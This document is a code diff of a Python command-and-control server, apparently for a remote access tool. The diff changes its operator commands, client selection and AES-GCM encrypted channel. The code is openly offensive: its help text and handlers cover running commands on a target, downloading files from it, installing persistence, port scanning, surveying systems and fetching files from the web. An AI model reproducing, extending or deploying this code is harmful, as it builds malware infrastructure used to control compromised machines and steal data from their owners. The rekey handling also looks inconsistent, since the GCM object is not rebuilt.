@@ -35,20 +35,20 @@ HELP_TEXT = '''
 client <id>         - Connect to a client.
 clients             - List connected clients.
 download <files>    - Download file(s).
+execute <command>   - Execute a command on the target.
 help                - Show this help menu.
 kill                - Kill the client connection.
 persistence         - Apply persistence mechanism.
 quit                - Exit the server and end all client connections.
 rekey               - Regenerate crypto key.
-run <command>       - Execute a command on the target.
 scan <ip>           - Scan top 25 ports on a single host.
 survey              - Run a system survey.
 unzip <file>        - Unzip a file.
 upload <files>      - Upload files(s).
 wget <url>          - Download a file from the web.'''
-COMMANDS = [ 'client', 'clients', 'download', 'help', 'kill', 'persistence',
-             'quit', 'rekey', 'run', 'scan', 'survey', 'unzip', 'upload',
-             'wget' ]
+COMMANDS = [ 'client', 'clients', 'download', 'execute', 'help', 'kill',
+             'persistence', 'quit', 'rekey', 'scan', 'survey', 'unzip',
+             'upload', 'wget' ]
 
 
 class Server(threading.Thread):
@@ -81,10 +81,11 @@ class Server(threading.Thread):
     
     def select_client(self, client_id):
         try:
-            return self.clients[int(client_id)-1]['client']
+            for c in self.clients:
+                if c['client_id'] == int(client_id):
+                    return c['client']
         except (ValueError, IndexError):
             print 'Error: Invalid client ID.'
-            return
     
     def get_clients(self):
         return [c for c in self.clients if c['client'].alive]
@@ -102,47 +103,49 @@ class ClientConnection(threading.Thread):
         self.conn   = conn
         self.addr   = addr
         self.dh_key = crypto.diffiehellman(self.conn, server=True)
+        self.GCM    = crypto.AES_GCM(self.dh_key)
+        self.IV     = 0
+        self.conn.setblocking(0)
         self.start()
     
     def send(self, prompt, cmd, action):
         if not self.alive:
             print 'Error: Client not connected.'
             return
-    
+        
+        # send prompt to client
+        # self.conn.send(crypto.AES_encrypt(prompt, self.dh_key))
+        crypto.sendGCM(self.conn, self.GCM, self.IV, prompt)
+        self.conn.settimeout(1)
+        self.IV += 1
+        
         # kill client connection
         if cmd == 'kill':
             self.conn.close()
-            return
-        
-        # send prompt to client
-        self.conn.send(crypto.AES_encrypt(prompt, self.dh_key))
-        
-        # results of a command
-        if cmd == 'run':
-            recv_data = self.conn.recv(4096)
-            print crypto.AES_decrypt(recv_data, self.dh_key).rstrip()
         
         # download a file
         elif cmd == 'download':
             for fname in action.split():
                 fname = fname.strip()
-                filesock.recvfile(self.conn, fname, self.dh_key)
+                filesock.recvfile(self.conn, self.GCM, fname)
 
         # send file
         elif cmd == 'upload':
             for fname in action.split():
                 fname = fname.strip()
-                filesock.sendfile(self.conn, fname, self.dh_key)
+                filesock.sendfile(self.conn, self.GCM, self.IV, fname)
 
         # regenerate DH key
         elif cmd == 'rekey':
             self.dh_key = crypto.diffiehellman(self.conn, server=True)
 
         # results of survey, persistence, unzip, or wget
-        elif cmd in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
+        elif cmd in ['execute', 'scan', 'survey', 'persistence', 'unzip', 'wget']:
             print 'Running {}...'.format(cmd)
-            recv_data = self.conn.recv(1024)
-            print crypto.AES_decrypt(recv_data, self.dh_key)
+            recv_data = crypto.recvGCM(self.conn, self.GCM).rstrip()
+            print recv_data
+            #recv_data = self.conn.recv(1024)
+            #print crypto.AES_decrypt(recv_data, self.dh_key)
 
 
 def get_parser():
